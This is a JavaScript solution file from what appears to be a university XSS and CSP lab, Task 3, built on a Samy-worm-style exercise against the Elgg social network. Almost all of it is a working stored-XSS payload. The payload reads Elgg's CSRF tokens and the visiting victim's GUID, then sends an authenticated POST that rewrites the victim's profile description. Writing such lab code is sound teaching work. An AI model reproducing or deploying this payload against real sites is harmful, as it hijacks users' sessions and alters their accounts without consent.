/*
 * Lab 3 — XSS and CSP
 * Task 3: Stored XSS — CSRF via XSS to modify victim's profile
 * Description:
 *   Unlike Task 2 (which used a simple GET request to add a friend),
 *   updating a user's profile requires a POST request with a full set of
 *   form fields.  This payload:
 *     1. Reads the CSRF tokens from the page.
 *     2. Reads the VICTIM's own GUID from the page (so it updates the
 *        correct profile, regardless of who visits).
 *     3. Builds a URL-encoded POST body containing all required Elgg
 *        profile fields.
 *     4. Sets the description field to "Samy is my hero".
 *     5. Fires the POST request authenticated by the victim's session.
 *
 * Key differences from Task 2:
 *   - Method: POST (not GET)
 *   - Requires Content-Type: application/x-www-form-urlencoded
 *   - Must supply the victim's GUID dynamically (can't hardcode it)
 *   - Must include all required profile fields in the request body
 */

(function () {
    "use strict";

    // ------------------------------------------------------------------
    // Step 1: Read CSRF tokens embedded by Elgg in every authenticated page
    // ------------------------------------------------------------------

    var ts    = elgg.security.token.__elgg_ts;
    var token = elgg.security.token.__elgg_token;

    // ------------------------------------------------------------------
    // Step 2: Determine the VICTIM's GUID dynamically
    // ------------------------------------------------------------------
    // Elgg stores the current user's GUID in elgg.session.user.guid.
    // Reading it at runtime means the payload works for ANY victim who
    // views the infected profile — we do not need to hardcode GUIDs.

    var guid = elgg.session.user.guid;

    // Guard: do not run if Samy is viewing their own profile (avoid
    // accidentally overwriting the attacker's own profile description
    // and breaking the payload storage).
    var samyGUID = 59;
    if (guid === samyGUID) {
        return;   // Attacker viewing own profile — do nothing
    }

    // ------------------------------------------------------------------
    // Step 3: Build the POST body with all required Elgg profile fields
    // ------------------------------------------------------------------
    // The Elgg profile-edit action validates that all of these fields are
    // present; omitting any required field causes the update to be rejected.

    var content =
        "__elgg_token="    + encodeURIComponent(token)           + "&" +
        "__elgg_ts="       + encodeURIComponent(ts)              + "&" +
        "name="            + encodeURIComponent("Samy")          + "&" +
        "description="     + encodeURIComponent("Samy is my hero") + "&" +
        // accesslevel[description]=2 makes the description field public (visible to all)
        "accesslevel%5Bdescription%5D=2"                         + "&" +
        "briefdescription=" + encodeURIComponent("")             + "&" +
        "location="        + encodeURIComponent("")              + "&" +
        "interests="       + encodeURIComponent("")              + "&" +
        "skills="          + encodeURIComponent("")              + "&" +
        "contactemail="    + encodeURIComponent("")              + "&" +
        "phone="           + encodeURIComponent("")              + "&" +
        "mobile="          + encodeURIComponent("")              + "&" +
        "website="         + encodeURIComponent("")              + "&" +
        "twitter="         + encodeURIComponent("")              + "&" +
        "guid="            + guid;   // Victim's GUID — edits their profile

    // ------------------------------------------------------------------
    // Step 4: Send the POST request
    // ------------------------------------------------------------------

    var sendURL = "http://www.seed-server.com/action/profile/edit";

    var ajax = new XMLHttpRequest();
    ajax.open("POST", sendURL, true);

    // The server expects URL-encoded form data, not JSON
    ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    ajax.withCredentials = true;   // Include the victim's session cookie

    ajax.send(content);

    // console.log("[XSS Task3] Profile update POST sent for GUID: " + guid);

})();
